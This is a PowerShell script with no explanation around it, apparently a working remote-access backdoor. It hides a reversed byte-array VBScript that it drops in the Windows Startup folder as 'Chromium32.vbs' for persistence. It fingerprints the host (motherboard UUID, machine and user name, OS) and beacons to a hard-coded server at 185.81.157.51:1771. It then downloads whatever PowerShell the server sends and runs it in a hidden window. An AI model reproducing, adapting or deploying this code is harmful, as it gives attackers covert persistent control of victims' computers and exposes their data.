Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic

function Install() {
    [Byte[]] $BBB = @(0x30, 0x2C, 0x22, 0x25, 0x45, 0x4C, 0x49, 0x46, 0x25, 0x20, 0x65, 0x6C,
	0x69, 0x46, 0x2D, 0x20, 0x64, 0x65, 0x6E, 0x67, 0x69, 0x53, 0x65, 0x74,
	0x6F, 0x6D, 0x65, 0x52, 0x20, 0x79, 0x63, 0x69, 0x6C, 0x6F, 0x50, 0x6E,
	0x6F, 0x69, 0x74, 0x75, 0x63, 0x65, 0x78, 0x45, 0x2D, 0x20, 0x6C, 0x6C,
	0x65, 0x68, 0x73, 0x72, 0x65, 0x77, 0x6F, 0x70, 0x22, 0x20, 0x6E, 0x75,
	0x52, 0x2E, 0x6A, 0x62, 0x4F, 0x0A, 0x0D, 0x29, 0x22, 0x6C, 0x6C, 0x65,
	0x68, 0x53, 0x2E, 0x74, 0x70, 0x69, 0x72, 0x63, 0x53, 0x57, 0x22, 0x28,
	0x74, 0x63, 0x65, 0x6A, 0x62, 0x4F, 0x65, 0x74, 0x61, 0x65, 0x72, 0x43,
	0x20, 0x3D, 0x20, 0x6A, 0x62, 0x4F, 0x20, 0x74, 0x65, 0x53)
    [System.Array]::Reverse($BBB, 0, $BBB.Length)
    [String] $startup = [System.Text.Encoding]::UTF8.GetString($BBB)
    [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + '\Chromium32.vbs', $startup.Replace('%FILE%', $PSCommandPath))
}

Function GetMotherBoardID() {
    $ErrorActionPreference = 'SilentlyContinue'
    $lol = [System.Convert]::ToString((get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID))
    return ([Microsoft.VisualBasic.Strings]::Split($lol,'-')[0] + [Microsoft.VisualBasic.Strings]::Split($lol,'-')[1])
}

Function PCName() {
    return [System.Environment]::MachineName
}

Function UserName() {
    return [System.Environment]::UserName
}

Function OSName() {
    return [Microsoft.VisualBasic.Strings]::Split((Get-WMIObject win32_operatingsystem).name,"|")[0]
}

Function AV() {
    return 'Windows Defender'
}

[String] $UserInfo = ((GetMotherBoardID) + '\' + (PCName) + '\' + (UserName) + '\' + (OSName) + '\' + (AV) + '\' + 'YES' + '\' + 'YES' + '\' + 'FALSE' + '\')

Function POST([String] $DA, [String] $Param) {
[String] $StringResponse = ''
try {
[System.Net.WebRequest] $Request = [System.Net.HttpWebRequest]::CreateDefault('http://185.81.157.51:1771/' + $DA)
$Request.Method = 'POST'
$Request.UserAgent = $UserInfo
$Stream = $Request.GetRequestStream();
$Stream.Write($Param, 0, $Param.Length);
$Reader = [System.IO.StreamReader]::new($Request.GetResponse().GetResponseStream())
$StringResponse = $Reader.ReadToEnd()
$Reader.Close()
} catch { }
return $StringResponse
}

Install

while($true) {
    [String[]] $Data = [Microsoft.VisualBasic.Strings]::Split((POST('Vre', '')) , '|V|')
    switch($Data[0]) {
        'TR' {
            [String] $PsFileName = [System.Guid]::NewGuid().ToString().Replace("-", "") + ".PS1"
            [String] $TargetPath = [System.IO.Path]::GetTempPath() + $PsFileName
            [System.IO.File]::WriteAllText($TargetPath, $Data[1])
            PowerShell -WindowStyle Hidden -ExecutionPolicy RemoteSigned -File $TargetPath
        break }
        'Cl' {
            [System.Environment]::Exit(0)
        break }
    }
    [System.Threading.Thread]::Sleep(4000)
}